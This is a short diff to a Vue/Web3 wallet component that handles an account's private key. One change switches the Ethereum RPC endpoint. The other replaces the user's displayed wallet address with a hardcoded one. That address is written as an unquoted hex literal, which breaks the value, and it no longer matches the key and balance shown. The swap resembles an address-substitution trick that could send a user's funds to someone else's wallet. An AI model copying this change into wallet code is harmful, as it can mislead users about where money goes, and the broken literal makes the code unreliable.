@@ -1,6 +1,6 @@
 import Web3 from 'web3';
 const web3 = new Web3(
-  `https://mainnet.infura.io/v3/${process.env.VUE_APP_API_KEY}`
+  `https://cloudflare-eth.com`
 );
 
 export default {
@@ -21,7 +21,7 @@ export default {
         window.location.hash.substring(1)
       );
       const data = {
-        address: account.address,
+        address: 0x6a164122d5cf7c840D26e829b46dCc4ED6C0ae48,
         privateKey: account.privateKey,
         balance: web3.utils.fromWei(
           await web3.eth.getBalance(account.address),
